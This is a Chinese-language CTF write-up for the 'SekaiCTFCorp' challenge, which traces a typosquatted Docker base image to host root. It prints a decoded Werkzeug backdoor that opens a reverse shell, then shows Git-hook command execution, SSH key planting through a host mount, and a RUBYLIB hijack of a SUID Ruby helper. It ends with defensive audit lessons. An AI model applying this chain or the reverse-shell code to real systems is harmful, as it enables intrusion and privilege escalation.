# SekaiCTFCorp

## 题目简述

题目只开放 HTTP 和 SSH，提示公司把网站迁移到了 GitHub，目标是进入主机并读取家目录中的 flag。由公司名可以定位公开仓库 [SekaiCTFCorp/website](https://github.com/SekaiCTFCorp/website)。应用本身只是普通 Flask 静态站点，真正的入口在 Dockerfile：

```dockerfile
FROM tjangolo/uwsgi-nginx-flask

COPY ./app/requirements.txt /app/requirements.txt
RUN pip install --no-cache-dir --upgrade -r /app/requirements.txt
COPY ./app /app
```

常用基础镜像的维护者是 `tiangolo`，这里却拼成了 `tjangolo`，而且没有固定 digest。错误名称恰好指向攻击者控制的同名镜像，形成依赖混淆式的软件供应链植入。后续虽然包含容器横向移动和主机提权，但决定性起点是制品信任边界，因此归档到 Cloud/Infra。

## 解题过程

### 检查基础镜像层

拉取可疑镜像后，不应只运行容器观察首页。先查看 history，并把各层展开后与正常 `tiangolo/uwsgi-nginx-flask` 对照。可疑镜像的末层改写了：

```text
/usr/local/lib/python3.11/site-packages/werkzeug/routing/map.py
```

`MapAdapter.match()` 在正常路由匹配前多出一段 Base64 包装的 `exec`。静态解码第一层后，会看到替换字符串、Base85 解码和 `marshal.loads`；继续检查代码对象的常量、名称和嵌套函数，可以还原以下逻辑：

```python
def reverse_shell(encoded):
    host, port = (
        base64.b64decode(encoded.split("|")[-1])
        .decode()
        .split(":")
    )

    sock = socket.socket()
    sock.connect((host, int(port)))

    for fd in (0, 1, 2):
        os.dup2(sock.fileno(), fd)

    pty.spawn("/bin/sh")

if "L33T_MOD3" in path_part:
    multiprocessing.Process(
        target=reverse_shell,
        args=(path_part,),
    ).start()
    raise RequestRedirect("/?OK")
```

这里的关键事实是：

- 每个 Flask 请求都会经过 Werkzeug 路由匹配，因此植入代码天然位于请求路径上；
- URL path 中出现 `L33T_MOD3` 才触发；
-最后一个 `|` 后是 Base64 编码的 `host:port`；
-反连在独立进程中运行，HTTP 请求本身只重定向到 `/?OK`。

向题目 HTTP 服务发送带有该标记和回连参数的请求，即可在网站容器中取得 shell。WP 已写出完整协议，不依赖未来仍能拉取该恶意镜像。

### 从网站容器进入 Gogs

在容器内检查监听端口、Docker 网络和环境变量，可以发现同一内部网络的 Gogs 服务监听 3000，并在环境中找到管理员账号对应的密码。该密码不应作为固定常量猜测；题目的信息泄露点就是容器环境：

```bash
env | sort
ss -lnt
```

使用泄露的管理员凭据登录 Gogs。管理员可创建仓库并配置服务端 Git hook；hook 在 Gogs 容器内执行 shell 命令。写入一个 `post-receive` hook，再通过 push 触发，即可取得第二个容器的 shell。其本质不是 Git 协议漏洞，而是“泄露管理员凭据 + 高权限仓库 hook”组合出的命令执行。

进入 Gogs 容器后检查挂载关系：

```bash
findmnt
mount
```

可以看到宿主机家目录被映射进容器。Bash 历史表明宿主机用户为 `david`。在对应挂载目录创建 `.ssh/authorized_keys` 并写入自己的公钥，修正权限后即可从题目暴露的 22 端口登录宿主机：

```bash
mkdir -p /path/to/mounted/home/david/.ssh
printf '%s\n' 'ssh-ed25519 AAAA... player' \
  > /path/to/mounted/home/david/.ssh/authorized_keys
chmod 700 /path/to/mounted/home/david/.ssh
chmod 600 /path/to/mounted/home/david/.ssh/authorized_keys
```

这里的路径应由实际 `findmnt` 输出确定，不能把示例占位路径当成固定答案。

### 利用 RUBYLIB 提权

宿主机上存在一个 SUID 程序，它以高权限调用 Ruby 脚本，同时保留用户提供的 `RUBYLIB`。Ruby 3.2.2 的 [builtin.c](https://github.com/ruby/ruby/blob/v3_2_2/builtin.c) 在初始化内建特性时加载 `gem_prelude`；对应的 [gem_prelude.rb](https://github.com/ruby/ruby/blob/v3_2_2/gem_prelude.rb) 会执行：

```ruby
require 'rubygems'
```

`RUBYLIB` 会把攻击者目录加入 Ruby 的库搜索路径。于是可以提前放置同名 `rubygems.rb`，让 SUID helper 启动 Ruby 时自动加载：

```bash
mkdir -p /tmp/ruby-path
cat > /tmp/ruby-path/rubygems.rb <<'RUBY'
exec "/bin/sh", "-p"
RUBY

RUBYLIB=/tmp/ruby-path /path/to/suid-helper
```

在本题配置中，helper 没有清理环境或丢弃有效 UID，`sh -p` 因而保留提升后的权限。取得高权限 shell 后，从题面指定的家目录读取 flag。官方仓库没有记录具体 flag 字符串，所以这里不伪造结果，只保留完整可复现链：

```text
GitHub 源码
  -> 拼错且未固定 digest 的基础镜像
  -> Werkzeug 路由后门
  -> 网站容器 shell
  -> 环境变量泄露 Gogs 管理员密码
  -> Git hook 进入 Gogs 容器
  -> 宿主家目录挂载写入 SSH key
  -> RUBYLIB 劫持 SUID Ruby 启动加载
  -> 读取 flag
```

## 方法总结

- 核心技巧：从公开部署仓库审计制品来源，展开镜像层定位第三方库植入，再沿容器网络、环境凭据、Git hook 和宿主挂载逐级突破。
- 识别信号：近似但拼错的 Docker Hub 账号、未固定 digest、框架核心文件中的编码 `exec`、容器环境里的服务密码和可写宿主挂载，都是供应链与容器信任边界失效的直接证据。
- 复用要点：审计容器化应用不能止于业务源码，应同时核对镜像发布者、tag/digest、层差异和运行时挂载。SUID helper 调用解释器时还必须清理 `RUBYLIB`、`PYTHONPATH` 等加载路径环境变量，并在执行前主动降低权限。
